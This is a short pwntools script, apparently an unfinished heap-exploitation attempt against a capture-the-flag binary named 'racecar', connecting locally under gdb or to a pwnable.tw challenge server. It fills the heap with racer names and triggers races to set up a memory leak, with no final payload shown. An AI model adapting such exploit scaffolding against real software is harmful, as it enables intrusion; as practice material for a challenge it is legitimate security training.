#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("racecar")
libc = ELF("./libc.so.6")

local = True 
if local:
    p = process("./racecar")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./racecar', checksec=False)

def add(name):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Name for new racer:", name)

def race():
    p.sendlineafter(b">", b"2")

def exit():
    p.sendlineafter(b">", b"3")    

for i in range(8):
    add(str(i)*0x90)

race()
race()
p.sendlineafter(b">", b"1")

p.sendafter(b"Name for new racer:", b"a")
p.interactive()